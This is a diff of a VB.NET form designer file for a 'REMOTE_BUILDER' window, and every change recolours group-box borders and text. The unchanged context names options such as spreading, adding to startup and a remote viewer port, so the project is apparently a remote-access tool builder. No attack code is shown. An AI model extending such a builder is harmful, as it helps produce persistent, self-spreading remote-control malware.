@@ -101,7 +101,7 @@ Partial Class REMOTE_BUILDER
         Me.XuiCustomGroupbox3.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
             Or System.Windows.Forms.AnchorStyles.Left) _
             Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
-        Me.XuiCustomGroupbox3.BorderColor = System.Drawing.Color.FromArgb(CType(CType(70, Byte), Integer), CType(CType(58, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.XuiCustomGroupbox3.BorderColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
         Me.XuiCustomGroupbox3.BorderWidth = 1
         Me.XuiCustomGroupbox3.Controls.Add(Me.XuiCustomGroupbox4)
         Me.XuiCustomGroupbox3.Controls.Add(Me.XuiCustomGroupbox2)
@@ -116,11 +116,11 @@ Partial Class REMOTE_BUILDER
         Me.XuiCustomGroupbox3.TabIndex = 14
         Me.XuiCustomGroupbox3.TabStop = False
         Me.XuiCustomGroupbox3.Text = "Connection Settings"
-        Me.XuiCustomGroupbox3.TextColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.XuiCustomGroupbox3.TextColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
         '
         'XuiCustomGroupbox4
         '
-        Me.XuiCustomGroupbox4.BorderColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.XuiCustomGroupbox4.BorderColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
         Me.XuiCustomGroupbox4.BorderWidth = 1
         Me.XuiCustomGroupbox4.Controls.Add(Me.Spread_CHK_BOX)
         Me.XuiCustomGroupbox4.Controls.Add(Me.AddToStartup)
@@ -134,7 +134,7 @@ Partial Class REMOTE_BUILDER
         Me.XuiCustomGroupbox4.TabIndex = 16
         Me.XuiCustomGroupbox4.TabStop = False
         Me.XuiCustomGroupbox4.Text = "Miscellaneous Settings"
-        Me.XuiCustomGroupbox4.TextColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.XuiCustomGroupbox4.TextColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
         '
         'Spread_CHK_BOX
         '
@@ -227,7 +227,7 @@ Partial Class REMOTE_BUILDER
         '
         'XuiCustomGroupbox2
         '
-        Me.XuiCustomGroupbox2.BorderColor = System.Drawing.Color.FromArgb(CType(CType(70, Byte), Integer), CType(CType(58, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.XuiCustomGroupbox2.BorderColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
         Me.XuiCustomGroupbox2.BorderWidth = 1
         Me.XuiCustomGroupbox2.Controls.Add(Me.NumericUpDown2)
         Me.XuiCustomGroupbox2.Controls.Add(Me.TextBox1)
@@ -238,7 +238,7 @@ Partial Class REMOTE_BUILDER
         Me.XuiCustomGroupbox2.TabIndex = 15
         Me.XuiCustomGroupbox2.TabStop = False
         Me.XuiCustomGroupbox2.Text = "Main Connection Settings"
-        Me.XuiCustomGroupbox2.TextColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.XuiCustomGroupbox2.TextColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
         '
         'NumericUpDown2
         '
@@ -264,7 +264,7 @@ Partial Class REMOTE_BUILDER
         '
         'XuiCustomGroupbox1
         '
-        Me.XuiCustomGroupbox1.BorderColor = System.Drawing.Color.FromArgb(CType(CType(70, Byte), Integer), CType(CType(58, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.XuiCustomGroupbox1.BorderColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
         Me.XuiCustomGroupbox1.BorderWidth = 1
         Me.XuiCustomGroupbox1.Controls.Add(Me.Remote_VPORT_UP)
         Me.XuiCustomGroupbox1.Location = New System.Drawing.Point(6, 113)
@@ -274,7 +274,7 @@ Partial Class REMOTE_BUILDER
         Me.XuiCustomGroupbox1.TabIndex = 14
         Me.XuiCustomGroupbox1.TabStop = False
         Me.XuiCustomGroupbox1.Text = "Remote Viewer Port"
-        Me.XuiCustomGroupbox1.TextColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.XuiCustomGroupbox1.TextColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
         '
         'Remote_VPORT_UP
         '
